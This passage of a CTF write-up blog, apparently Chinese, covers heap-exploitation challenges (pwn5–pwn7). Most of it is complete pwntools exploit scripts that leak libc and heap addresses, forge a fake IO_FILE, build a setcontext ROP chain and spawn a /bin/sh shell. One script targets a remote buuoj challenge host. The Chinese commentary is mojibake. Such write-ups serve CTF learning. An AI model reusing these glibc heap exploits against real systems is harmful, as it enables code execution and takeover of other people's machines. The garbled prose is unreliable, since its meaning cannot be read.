class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28733</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(-<span class="number">4</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x600</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x61</span>-<span class="number">0x1e1000</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x600</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0xf90</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(libc_addr+<span class="number">0x1e1000</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x1ed5b0</span>-<span class="number">0x20</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0xa00</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xce</span>))</span><br><span class="line">    fake_IO_FILE=p64(<span class="number">0x00000000fbad2087</span>)</span><br><span class="line">    system_addr=libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    fake_IO_FILE+=p64(heap_addr+<span class="number">0x2100</span>)*<span class="number">8</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(heap_addr)  <span class="comment"># _lock = writable address</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0x1e1a20</span>+libc_addr + <span class="number">0x40</span>)  <span class="comment"># vtable</span></span><br><span class="line">    fake_IO_FILE += p64(heap_addr+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rdi</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># pay=system_addr^(heap_addr+0xf90)</span></span><br><span class="line">    <span class="comment"># pay1=pay&amp;0x7ff</span></span><br><span class="line">    <span class="comment"># pay2=pay&amp;</span></span><br><span class="line">    fake_IO_FILE += p64(ROL(system_addr ^ (heap_addr + <span class="number">0xf90</span>), <span class="number">0x11</span>))</span><br><span class="line">    fake_IO_FILE+=p64(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    edit(-<span class="number">4</span>,fake_IO_FILE)</span><br><span class="line">    <span class="comment">#fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(system_addr ^ (heap_addr + <span class="number">0xf90</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x600</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>pwn6</p>
<p>house of kiwi,ç½‘ä¸Šè®²çš„éå¸¸æ¸…æ¥šï¼Œå°±ä¸è¯´æ”»å‡»æµç¨‹äº†ï¼Œè¿™é“é¢˜æœ€ä¸»è¦çš„é—®é¢˜æ˜¯é™åˆ¶å…±äº«åº“çš„ä½ç½®ï¼Œç„¶åæ²¡æœ‰ç¬¦å·è¡¨è°ƒè¯•çš„æ—¶å€™å¾ˆéš¾å—ï¼Œmarkç»™äº†ç¬¦å·è¡¨å’Œè°ƒè¯•è„šæœ¬æ‰èƒ½è¿›è¡ŒåŠ¨è°ƒ.è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process([<span class="string">&#x27;./ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>:<span class="string">&#x27;./libc-so.6&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,26914)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    load1=<span class="string">&quot;source ./loadsym.py\n&quot;</span></span><br><span class="line">    load2=<span class="string">&quot;loadsym &#x27;/home/ctf/getshell/des/pwn4/1/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.31.so&#x27;\n&quot;</span></span><br><span class="line">    gdb.attach(sh,load1+load2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Before the game starts, please give me your name:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;How much do you want?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to put?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Tell me your idea:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to remove?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to look?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to change?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Change your idea:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    init(<span class="string">&#x27;zhangpeng&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x48</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        add(<span class="number">0xb0</span>,i,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p8(<span class="number">0xc1</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">    _IO_file_jumps_addr=libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]+libc_addr</span><br><span class="line">    <span class="comment">#IO_helper_jumps_addr=libc.sym[&quot;_IO_helper_jumps&quot;]+libc_addr</span></span><br><span class="line">    _IO_helper_jumps_addr=libc_addr+<span class="number">0x1ec960</span>-<span class="number">0xc0</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    setcontent_addr=libc_addr+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(_IO_file_jumps_addr+<span class="number">0x60</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">4</span>,p64(setcontent_addr))</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x920</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(_IO_helper_jumps_addr+<span class="number">0xa0</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">5</span>,p64(heap_addr+<span class="number">0xa00</span>))</span><br><span class="line">    ret_addr=libc_addr+<span class="number">0x0000000000025679</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">2</span>,p64(_IO_helper_jumps_addr+<span class="number">0Xa8</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">6</span>,p64(ret_addr))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">    add(<span class="number">0x70</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x78</span>+p8(<span class="number">0xc1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    pop_rax=libc_addr+<span class="number">0x000000000004a550</span></span><br><span class="line">    pop_rdi=libc_addr+<span class="number">0x0000000000026b72</span></span><br><span class="line">    pop_rsi=libc_addr+<span class="number">0x0000000000027529</span></span><br><span class="line">    pop_rdx_r12=libc_addr+<span class="number">0x000000000011c371</span></span><br><span class="line">    syscall_addr=libc_addr+<span class="number">0x000000000002584d</span></span><br><span class="line">    rop=p64(pop_rax)+p64(<span class="number">59</span>)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_addr+<span class="number">0xa60</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    rop+=p64(syscall_addr)</span><br><span class="line">    rop=rop.ljust(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    rop+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="number">1</span>,rop)</span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xce</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    debug()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;How much do you want?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to put?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><p>ç®—æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œä¹Ÿæ˜¯çœ‹çš„æœ€ä¹…çš„ä¸€é“é¢˜ï¼Œå¯ä»¥é€šè¿‡mmapä¼ªé€ å †å—freeæ”¾åˆ°binä¸Šï¼Œç”±äºä½¿ç”¨çš„æ˜¯calloc,æ‰€ä»¥æ— æ³•ç®€å•çš„ä½¿ç”¨tcacheå®Œæˆæ”»å‡»ï¼Œèƒ½ä½¿ç”¨çš„åªæœ‰largebinattackæ²¡æ³•æ•´ï¼Œåæ¥ç»è¿‡æç¤ºå‘ç°å¯ä»¥ä½¿ç”¨House of Corrosionå®Œæˆä¸€å®šèŒƒå›´çš„ä»»æ„å†™ï¼Œè¿™å°±å¥½åŠå¤šäº†ï¼Œæ§åˆ¶stderrçš„vtableæŒ‡å‘_IO_helper_jumps,ç„¶åä¿®æ”¹ _IO_helper_jumpsåç§»ä¸º0x60çš„å‡½æ•°æŒ‡é’ˆä¸ºsystemï¼Œç„¶åæŠŠstderrçš„å‰å…«ä¸ªå­—èŠ‚æ”¹æˆå­—ç¬¦ä¸²<code>/bin/sh</code>,ç„¶åæ§åˆ¶topchunkåˆ°mmapçš„ç©ºé—´ï¼Œä¿®æ”¹sizeç”³è¯·å †å—è§¦å‘__malloc_assertå‡½æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert (const char *assertion, const char *file, unsigned <span class="built_in">int</span> line,</span><br><span class="line">       const char *function)</span><br><span class="line">&#123;</span><br><span class="line">(void) __fxprintf (NULL, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (stderr);</span><br><span class="line">abort ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨fflushä¸­å°±ä¼šè°ƒç”¨stderrä¸­vtableçš„åç§»ä¸º0x60å‡½æ•°æŒ‡é’ˆï¼Œæ­¤æ—¶rdiæŒ‡å‘stderrç»“æ„ä½“ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€ï¼Œåç§»ä¸º0x60å‡½æ•°æŒ‡é’ˆä¹Ÿæ˜¯system,æ­¤æ—¶å°±getshelläº†ã€‚</p>
<p>è„šæœ¬æ¯”è¾ƒä¹±ï¼Œå…¶ä¸­å¥½å¤šæ²¡ç”¨ï¼Œæ‰€ä»¥çœ‹èµ·æ¥è¿™ä¹ˆå¤š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span 